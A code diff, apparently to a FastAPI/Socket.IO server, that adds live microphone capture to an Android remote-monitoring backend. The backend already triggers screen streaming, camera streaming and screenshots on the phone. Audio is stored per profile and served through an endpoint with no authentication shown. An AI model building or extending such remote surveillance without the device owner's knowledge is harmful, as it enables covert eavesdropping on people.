@@ -282,6 +282,15 @@ async def get_live_frame(profile_id: str):
     return {"frame": data["frame"], "profileId": profile_id, "ts": data["ts"]}
 
 
+@app.get("/api/audio/{profile_id}/live")
+async def get_live_audio(profile_id: str):
+    """Son ses chunk'ını döndürür (polling fallback)."""
+    data = _live_audio.get(profile_id)
+    if not data:
+        raise HTTPException(status_code=404, detail="Ses verisi yok")
+    return data
+
+
 from fastapi import UploadFile, File, Form
 
 @app.post("/upload-screenshot")
@@ -390,6 +399,22 @@ async def handle_camera_frame(sid, data):
     await sio.emit("camera_frame", data)
 
 
+_live_audio: dict = {}
+
+
+@sio.on("audio_frame")
+async def handle_audio_frame(sid, data):
+    """Android'den gelen ses chunk'larını saklar ve dashboard'a iletir."""
+    if isinstance(data, dict):
+        pid = data.get("profileId", "default")
+        _live_audio[pid] = {
+            "chunk": data.get("chunk"),
+            "sampleRate": data.get("sampleRate", 16000),
+            "ts": data.get("ts"),
+        }
+    await sio.emit("audio_frame", data)
+
+
 @sio.on("snapshot")
 async def handle_snapshot_event(sid, data):
     """Android'den gelen tek kare snapshot'ı dashboard'a iletir."""
@@ -414,10 +439,11 @@ async def handle_command(sid, data):
     elif cmd_type == "stop":
         await sio.emit("stop_screen_stream", {}, to=mobile_sid)
         await sio.emit("stop_camera_stream", {}, to=mobile_sid)
+        await sio.emit("stop_microphone", {}, to=mobile_sid)
     elif cmd_type == "photo":
         await sio.emit("take_screenshot", {}, to=mobile_sid)
     elif cmd_type == "audio":
-        pass  # gelecek sürümde
+        await sio.emit("start_microphone", {}, to=mobile_sid)
 
 
 @sio.on("register")
